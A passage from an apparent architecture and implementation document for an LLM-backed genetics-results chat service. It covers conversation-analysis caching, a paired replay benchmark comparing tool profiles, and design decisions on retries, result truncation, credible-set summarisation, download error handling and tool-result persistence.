  the raw `chat_sessions.updated_at` string so staleness comparisons stay consistent.
- **Staleness-based selection**: the nightly run does minimal LLM work by asking the DB
  (`get_stale_or_missing_session_ids`) which in-range sessions actually need (re)analysis —
  ones with no row, a continued conversation (`chat_sessions.updated_at` advanced past
  `conversation_analysis.analyzed_at`), or an `analyzer_version` mismatch. Only those are
  evicted from the reconstructed topic/quality cache and sent to the LLM; unchanged,
  current-version sessions are skipped but still flow into the report (the report always
  aggregates the full in-range set, cached + freshly judged). `--start-from` / `--until`
  intersect with the stale set as an additional date filter. Because `upsert_analysis`
  writes `analyzed_at = CURRENT_TIMESTAMP`, a re-judged continued conversation is no
  longer stale on the next run (a future `updated_at` would correctly stay stale).
  After changing the judge prompt or scoring, re-run with `--refresh-quality`
  (re-judge, keep topic cache), `--no-cache` (recompute all), or `--force` (reanalyze
  every conversation from scratch — a superset of `--no-cache` for the selected range;
  `--force` wins over `--refresh-quality` since it recomputes topics too). The issue text →
  taxonomy-category map remains a small flat sidecar at `<output-dir>/.cache/issue_categories.json`.

## Replay Benchmark

`scripts/replay_benchmark.py` replays the `user_turns` sequences from
`eval_dataset.json` through `POST /chat/v1/chat` under two `tool_profile` arms and
reports per-arm distributions. It is the measurement gate for the code-execution
epic (`genetics-results-suite-4h6`): a candidate arm has to beat the recorded
baseline before it is defaulted on.

**Running it costs real money** — production averaged $2.01 per turn, and the
harness issues two arms per case. `--base-url` therefore defaults to
`http://localhost:8000`, never a deployment, and `--dry-run` resolves the whole plan
(case order, arm order, turn count) without issuing a single request.

- **Paired design.** Both arms of a case run back to back inside one worker, so a
  model swap or an API slowdown mid-run hits both arms equally. `--concurrency`
  parallelises over *cases*; the semaphore is held for the whole case, so the two
  arms of one case never overlap. Case order is deterministic (sorted on
  `session_id`) and the arm order alternates by case index — even cases run
  (A, B), odd cases (B, A) — so the second-position warm-cache advantage does not
  accrue to one arm. The order actually used is recorded per case in the report.
- **The analysis is matched, because the design is paired.** The headline
  distributions (`report["matched"]`) cover only the `(case_id, turn_index)` pairs
  that came back `ok` on *both* arms. Summarising each arm's own `ok` turns
  independently would reward an arm for failing: `replay_case_arm` aborts only the
  failing arm, so an arm that dies on the hard, late, expensive turns keeps just its
  cheap early ones while the healthy arm carries the full tail, and its
  iterations/cost/latency medians drop *because it failed*. The per-arm marginals are
  still reported (`report["per_arm"]`) but printed under an explicit "UNMATCHED
  MARGINALS — not comparable across arms" heading, and the summary states how many
  `ok` turns each arm contributed that the other arm did not.
- **Replayed history carries the tool results.** The `done` chunk's `tool_results`
  are appended after the assistant message as `{"role": "user", "content":
  tool_results}` — exactly what the browser does (`LLMChat.tsx`) and what
  `llm_service` itself does inside the agentic loop. Without them
  `_sanitize_tool_blocks` strips every `tool_use` block of the replayed assistant
  turn as orphaned, so from turn 2 on the model would see an assistant that answered
  out of thin air. That matters more here than anywhere else: tool results are the
  bulk of the context growth the benchmark exists to measure (median 39k → 117k
  tokens across a conversation), and the loss is asymmetric — the arm calling more or
  larger tools loses more context, compressing the measured gap between arms.
- **Metrics come off the SSE stream, not the database.** Every request carries
  `secret=true` (a benchmark must not write into a user's history), and secret chat
  deliberately writes no `chat_turn_metrics` row, so the DB is not an option — see
  the `chat_turn_metrics` section. `llm_service` yields a `usage` chunk per model
  roundtrip; the harness reads `iteration`, per-iteration `input_tokens`,
  `total_input_tokens`, `total_output_tokens` and `context_percent` from it, and
  takes the tool-call count from the `done` chunk's `message_content` by counting
  real `tool_use` blocks (never the `*[Using tool: …]*` display markers, which the
  model has been observed to imitate as prose).
- **The `usage` chunk's `input_tokens` is the whole context**, i.e.
  `input_tokens + cache_read + cache_creation`, while `total_input_tokens`
  accumulates only the billed uncached input. `cached_input_tokens` is therefore
  derived as `sum(per-iteration input_tokens) - total_input_tokens`. The harness
  cannot split that into cache reads and cache creations, which differ by more than
  12x in price, so **cost is reported as an interval**, `cost_usd_min` (all cached
  tokens priced as cache reads) to `cost_usd_max` (all priced as cache creations),
  never as a single fabricated number. The chunk itself no longer forces this:
  `genetics-results-suite-n3p` added `cache_read` and `cache_create` to the `usage`
  payload, so an exact figure is now derivable and the harness can drop the interval
  — it has not been switched over yet. Pricing also needs a model name the pricing
  table actually knows: without `--model`, *or* with a model `cost.has_pricing()`
  cannot match (`gpt-4o`, a transposed `claude-4-opus`), the USD fields are `null`
  ("not priced") with a warning, not `0` and not silently priced at the
  `_match_pricing` Sonnet fallback.
- **A turn that reaches `done` without a single `usage` chunk is `no_usage_chunks`,
  not `ok`.** Iterations, tokens and cost are all unmeasurable for it, so counting
  its (necessarily zero) `tool_use` blocks would push a fake `0` into the tool-call
  distribution while contributing nothing to any other, diverging the two samples'
  `n` and dragging the tool-call median down. This is not hypothetical: the OpenAI
  path in `llm_service` yields one synthetic text block with no usage chunk and no
  tool_use blocks, so a deployment whose `default_provider` is OpenAI would report
  `tool_calls=0` for every turn. `--provider` pins the provider on the request and is
  recorded in the report config. The history stays intact, so the rest of the case
  still runs; it is the status, not an abort, that keeps the turn out of the
  comparison.
- **`--timeout` is a wall-clock deadline per turn**, enforced with
  `asyncio.timeout` around the whole stream. httpx's timeout is per *read*, and
  `sse_starlette` sends a keepalive comment every 15s that the parser drops silently
   — each one resets a read timeout, so a wedged generator could stream keepalives
  (and burn money) indefinitely without ever tripping it.
- **Distributions, not medians.** Every metric is reported as n / mean / p25 / p50 /
  p75 / p90 / p95 / max, because the production distribution is tail-weighted
  (iterations median 2 but p95 8, max 25). A percentile is flagged
  `unreliable at n=<n>` whenever `n * (1 - p) < 1`, i.e. when the sample has no
  observation above it and the "percentile" is just the maximum: p25 and p50 need
  n≥2, p75 n≥4, p90 n≥10, p95 n≥20. The threshold is computed as
  `ceil(100 / (100 - p))`, not `ceil(1 / (1 - p/100))` — the latter makes p90's
  threshold 11 because `1 - 0.9` is `0.09999999999999998` in binary floating point.
  The human summary states N and warns outright below 10 cases.
- **Failures are counted, never dropped.** A turn that errors, times out or hits an
  unreachable target is recorded with its status and message; the remaining turns of
  that case *and that arm only* are recorded as `not_attempted` (the history is
  broken, so they cannot be replayed under comparable conditions). The other arm and
  every other case continue. A whole case that raises out of the worker emits one
  `error` record per `(arm, turn_index)` over its planned turns, in that case's
  alternated arm order — not two `turn_index=0` records, which would under-report
  `turns_attempted` and hide the loss from the per-status table.
- **Script-failure and retry-loop counters are declared but not yet emitted.**
  A code-execution arm scores ~1 tool call by construction, so tool-call count alone
  is a dishonest win condition; the counters exist to price the failure modes that
  offset it. Nothing on the chat stream emits script results today, so the harness
  looks for a `script_result` chunk (`exit_code` / `timed_out` / `exception`) and,
  when it sees none, reports `null` and prints `NOT MEASURED` with the reason —
  deliberately *not* `0`, which would read as "measured, no failures". Once the
  sandbox arm emits the chunk the fields populate, and a run with scripts that all
  succeeded then reports a real `0`. The `NOT MEASURED` branch keys on `script_runs
  is None`, never on `script_failure_rate is None`: the rate is also `None` for an arm
  that *was* measured and ran zero scripts, and printing that as unmeasured would
  defeat the whole point of distinguishing the two states.
- **Output** is a JSON report (`--output`) carrying the config, the per-case arm
  order, the matched-pair headline summaries, the unmatched per-arm marginals and
  every individual turn record (including the per-iteration usage detail), plus a
  human-readable summary on stdout.
- Authentication, when the target requires it, comes from `$REPLAY_AUTH_TOKEN` and is
  sent as a bearer token; it is never written into the report or logged.

## Development Workflow

- **Issue tracking**: beads (`bd`) tracks epics and tasks in `.beads/`, synced with git
- **Feature planning**: new features go through architecture exploration (`.claude/agents/architecture-explorer.md`) which proposes 3 alternatives, then the selected approach is broken into ultrafocused subtasks in beads
- **Task execution**: work through subtasks via `bd ready`, updating status as you go

## Documentation

- `README.md`: Installation, quick start, tool reference
- `.env.example`: All configuration variables
- This document: Architecture and implementation details

## Architecture decisions

1. **Shared tool definitions**: Single source of truth in `definitions.py` prevents drift between MCP and LLM service
2. **Async throughout**: All I/O uses async/await for concurrent tool execution
3. **Graceful degradation**: External service failures don't crash the server; fallbacks are used where available
4. **Streaming responses**: Chat API streams tokens via SSE for responsive UX. Multiple event types (`content`, `usage`, `image`, `error`, `done`) provide real-time feedback. Context usage tracking via `usage` events enables the frontend to show a live progress bar of context window consumption (see SSE event types section).
5. **Agentic loop**: LLM service supports multi-turn tool use with configurable iteration limit
6. **Retry on transient errors**: Anthropic API calls are retried up to 3 times with exponential backoff (1s, 2s, 4s) for transient errors. Retryability is detected two ways because of a streaming quirk: connection errors and `APIStatusError` with HTTP status 500/502/503/529, **and** by the error type carried in the body (`overloaded_error`, `api_error`, `internal_server_error`). The latter is essential — errors that arrive mid-stream (after the SSE connection returns HTTP 200) surface as a base `APIStatusError` with `status_code=200`, so status-code matching alone misses them (`anthropic_error_type()` in `llm_service.py` reads the real type from the body). If text was already streamed before the error, the user is notified with a "[Connection interrupted, retrying...]" message. When retries are exhausted, `_classify_error` (in `chat_api.py`) maps the error to a user-facing message keyed on the same body type: overload → "Claude is temporarily overloaded… please wait a moment and resend"; internal/upstream → "Claude had a temporary upstream error." Non-retryable errors (auth, bad request, rate limit) propagate immediately.
7. **Result truncation**: Large responses are truncated with warnings to prevent context overflow. The cap is `settings.mcp_max_result_size` (50,000 chars) applied to the serialized tool result in `llm_service.py`. The notice is built by `_truncation_notice()`, which states that what survives is an ordered PREFIX rather than a sample, that entire categories may be invisible, and that the result must not be used to count, to enumerate, or to conclude absence — pointing instead at narrower arguments, `summarize=true`, or the download link. Its item count comes from `_count_result_items()`, which understands every shape the data tools return (`results`, `rows`/`total_rows`, and `n_cs`/`cs`); counting only `results` previously dropped the count for exactly the credible-set summaries, degrading the notice to a bare "response too large". The system prompt carries the matching rule (`config/defaults.py`, under Tool Usage Guidelines). Truncation is positional, so it interacts badly with server-side row ordering: an unfiltered `get_credible_sets_by_qtl_gene` for a well-studied gene returns thousands of rows sorted by chromosome/position, and the tail — which may be the only rows of the requested data type — is cut before the model sees it. This produced a real wrong answer ("no caQTL rows at all" for IL7R, which in fact has 3,058). The fix is to filter server-side: the `data_types` parameter on `get_credible_sets_by_gene` / `_by_variant` / `_by_qtl_gene` is now a real API query parameter (previously it was sent and silently ignored by the results-api, which is also why the truncation was reached), and the results-api rejects undeclared query parameters with 422 so this class of drift cannot recur silently. `get_credible_sets_by_qtl_gene` also now defaults `summarize=True`, matching its sibling credible-set tools; it was the only one defaulting to variant-level rows, which is how a routine gene query reached 1.57 M chars. The summary is credible set-level, sorted by `mlog10p` and grouped by `data_type`, so what truncation drops is the weakest-signal tail rather than an entire chromosome's worth of rows. **A credible set is keyed by `(resource, dataset, trait, cell_type, cs_id)`, never by `cs_id` alone** — `cs_id` is unique only within one dataset's fine-mapping run of one trait in one cell type. caQTL `cs_id`s are derived from the chromatin peak and recur in every cell type the peak was tested in; eQTL Catalogue `cs_id`s like `ENSG00000187608_L1` recur across QTD studies. `_summarize_credible_sets_simple` grouped on `cs_id` alone, merging those into one row each: for IL7R caQTL it reported 46 credible sets across 9 cell types where the data holds 129 across 13, and PCSK9 caQTL came out at 78 instead of 359. Both aggregations now run in a single `group_by` on the full key — joining them would have to match on `cell_type`, which is null for GWAS, where `null != null` silently drops rows. `_summarize_credible_sets_trait` (used only by `get_credible_sets_by_phenotype`, a single resource and phenotype per call) is unaffected, since `cs_id` genuinely is unique in that scope. The summary also carries a `counts` block (`_summary_counts`) of per-data-type distinct totals — credible sets, associations (variant-level rows, matching an equivalent BigQuery `COUNT(*)`), variants, traits, cell types, datasets, plus `n_peaks` from `trait_original` for caQTL, whose molecular trait is a chromatin peak. It is emitted before `cs` in the dict so it survives truncation: at ~500 bytes for all data types it always fits, which means "how many peaks / cell types / associations" is answerable even on a result 28x over the cap, instead of the model counting whatever credible sets happened to fit
8. **Downloadable results**: Tools returning tabular data include `INCLUDE_IN_RESPONSE` download links. Direct API URLs are used for genetics API tools that support TSV format; other tools (BigQuery, LD, summary stats) have their results converted to TSV and stored on disk, served via `/chat/v1/downloads/{id}`. The `_download_url` and `_download_data` hints in tool results are processed by `_process_download_hints()` in `llm_service.py` before being sent to the LLM. All download links use relative URLs (e.g., `/api/v1/...` or `/chat/v1/downloads/...`) so they work correctly regardless of deployment domain. `INCLUDE_IN_RESPONSE` is placed at the front of the result dict so it survives JSON truncation for large results. For BigQuery, trailing SQL `LIMIT` clauses are stripped and `max_rows` is set to 100,000 so the download contains the full result set even when the LLM only displays a subset. The BigQuery proxy (`genetics-results-db`) enforces `MAX_ROWS=100000` as a hard cap. **A download failure is never silent.** `_process_download_hints` used to catch bare `Exception`, log a warning and return the result with `_download_data` already popped, which produced no link, no error to the user and no error to the model — indistinguishable from a result that never warranted a download, so nobody reported it. That hid the identical positional-rows defect twice (`bef`, then `buc` months later). Two things now hold: (1) `_convert_to_tsv` validates both shapes up front — including `filename`, which is `json.dump`ed into the sidecar *after* the `.tsv` is written, so a non-`str` would raise past the allow-list and orphan the data file — and raises `DownloadShapeError` (a `TypeError` subclass) naming the expected and the observed shape; (2) three failure modes are caught, each with its own ERROR log token and its own user-visible `INCLUDE_IN_RESPONSE` note, and **none of them is fatal to the chat turn**. A `DownloadShapeError` is logged as `DOWNLOAD_SHAPE_DEFECT tool=<name> shape=<observed>` with `exc_info=True` and surfaced as `DOWNLOAD_SHAPE_NOTE` (unexpected structure, results unaffected, logged for investigation, explicitly *not* worth re-running). A shape defect is not necessarily a local programming error: only the six BigQuery-backed tools and the UniProt helper build the payload locally, while most of the ~25 producers put the sibling results-api's parsed response body straight into `_download_data` unvalidated (`executor.py` `_get_ld_matrix`, `_get_summary_stats`, …), so a bad shape is as likely to be **upstream drift** — a class of failure this repo has already seen — and coupling chat-turn success to another repo's response shape would trade a missing link for a lost answer. `OSError` (everything the store can fail with — `ENOSPC`, permissions, a storage path that is not a directory) and `UnicodeEncodeError` (upstream JSON can decode lone surrogates that utf-8 cannot encode) keep the `DOWNLOAD_FAILED tool=<name> shape=<observed> error=<type>` token and `DOWNLOAD_FAILED_NOTE`, which now states the effect without asserting a cause (re-running helps for `ENOSPC` but never for an unencodable value). The distinct tokens matter operationally: `genetics-results-suite`'s `scripts/monitor/alerter.py` queries severity ≥ WARNING and pushes new alerts to Slack, so a disk problem and a producer/upstream defect are separable there. Both call sites (`_stream_anthropic`, `subagent._execute_subagent_tool`) pass `tool_name` so the log identifies the producer among the ~25 that emit `_download_data`. A recognized-but-empty payload (`{"results": []}`) still yields no link and no note — there is genuinely nothing to download.
9. **Tool result persistence (resumed conversations carry the data substrate)**: The chat API is stateless per request — the frontend replays the full conversation each turn. Tool `tool_result` blocks are persisted (`chat_messages.tool_results_json`, added via the standard PRAGMA/ALTER migration) so a resumed conversation replays the actual tool outputs the model saw, not just its prose summary. `_stream_anthropic` collects `all_tool_results` across agentic-loop iterations and emits them in the `done` SSE event; the frontend stores them and, on resume, rebuilds the `assistant(tool_use) → user(tool_result)` pairing (its history builder splits each persisted assistant turn into the assistant message plus a synthetic user message of `tool_result` blocks). The already-truncated, image-base64-stripped result content is stored as-is. **Backward compatible**: conversations saved before this feature have `tool_results_json = NULL`; on resume they emit only the assistant message and `_sanitize_tool_blocks` (in `llm_service.py`) strips the now-orphaned `tool_use` blocks — exactly the prior behavior. **Marker-strip safeguard**: the `*[Using tool: …]*` annotations injected during streaming are display-only, but they are persisted into the assistant text. Before history reaches the model, `_strip_tool_use_markers` (in `llm_service.py`, run just before `_sanitize_tool_blocks`) removes them from replayed assistant content (both string and text-block forms). Without this, a long/repetitive conversation could teach the model to imitate the notation — writing `*[Using tool: X]*` as prose instead of emitting a real `tool_use` block, then fabricating the result (observed in a real session whose tool-less turns predated the persistence fix). Real `tool_use` blocks are left untouched. To offset the larger replayed payload, `_mark_history_cache_breakpoint` adds a `cache_control: ephemeral` breakpoint on the last replayed message (the 3rd of Anthropic's 4 breakpoints, alongside the system prompt and tool definitions). System-prompt guardrails (`config/defaults.py`) additionally instruct the model to treat credible-set membership as distinct from LD and to re-query authoritative tools for count/membership/lead questions rather than relying on earlier summaries.

## Future considerations

1. Add caching for genetics API responses
2. Support additional LLM providers (Google, local models)
3. Implement tool-level access control
4. Add WebSocket transport for bidirectional streaming
